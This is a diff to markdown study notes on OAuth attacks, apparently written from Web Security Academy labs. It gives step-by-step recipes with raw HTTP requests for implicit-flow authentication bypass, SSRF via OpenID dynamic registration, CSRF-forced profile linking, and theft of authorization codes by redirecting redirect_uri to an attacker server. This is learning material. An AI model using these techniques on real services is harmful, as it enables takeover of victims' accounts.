@@ -1,10 +1,10 @@
 # OAuth Vulnerabilities
-## Authentication bypass via OAuth implicit flow
+## 1. Authentication bypass via OAuth implicit flow
 When we get the token from the OAuth provider, this token along with the username/email would get passed to Client Application.<br>
 Change the userid/email keeping the token same and repeat this request in repeater.<br>
 If don't get any error and session idenfitiers are provided by the client app means it was vulnerable(Show response in browser).
 
-## SSRF via OpenID Dyanmic Registration
+## 2. SSRF via OpenID Dyanmic Registration
 Login into the application via OAuth and notice the /logo endpoint getting called from client app. Send it to repeater, say Request1.
 ```
 GET /client/3Li31gSjU7n40abUrahrS/logo HTTP/2
@@ -58,7 +58,7 @@ Content-Length: 158
 }
 ```
 Now hit the Request1 with appropriate client Id.
-## One Click Account takeover CSRF (Forced OAuth Profile Linking)
+## 3. One Click Account takeover CSRF (Forced OAuth Profile Linking)
 This vulnerability arises due to the absence of state parameter. The steps to reproduce are:
 * Login into the application and click on `Add Social Account`.
 * Provide your username and password on OAuth login page and accept the confirmation while intercepting all the request.
@@ -81,4 +81,43 @@ Te: trailers
 ````
 * Drop the above request and send this request to victim.
 * Once victim clicks on the link his account would be linked with your gmail account and you can access his account via OAuth login.
-
+## 4. Account Hijacking via redirect_uri
+In this attack, we will steal the `code` value that is provided by OAuth server after successfull authentication. The steps to reproduce are:
+* Login with your social media account in the application and provide the consent. Below are the two requests you will notice.
+Request 1 (Initial request while we click on login via google or something):
+```
+GET /auth?client_id=pjvrmyg30mxmuf7jgzpco&redirect_uri=https://0a25007c03cf320180bc3fca001d00d3.web-security-academy.net/oauth-callback&response_type=code&scope=openid%20profile%20email HTTP/2
+Host: oauth-0ab000ba034d324980dc3d72025800c1.oauth-server.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://0a25007c03cf320180bc3fca001d00d3.web-security-academy.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Priority: u=0, i
+Te: trailers
+Connection: keep-alive
+```
+Request 2 which contains code value and used to get the session identifiers from application server
+```
+GET /oauth-callback?code=RvyOZxEyvTvr74-6DlUSDbhppnz1Bwn6mPZxXfPna-c HTTP/2
+Host: 0a25007c03cf320180bc3fca001d00d3.web-security-academy.net
+Cookie: session=LG0xHOTr40VfuDnLbkus4yNGLAaAmJyO
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://oauth-0ab000ba034d324980dc3d72025800c1.oauth-server.net/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: cross-site
+Sec-Fetch-User: ?1
+Priority: u=0, i
+Te: trailers
+```
+* In the Request 1 replace redirect_uri with your attacker server and when the victim user who is already logged in clicks on the link then the code value would sent to our attacker server.
+* Use the code value in incoginto as shown in Request 2 and you will be logged in as victim account.
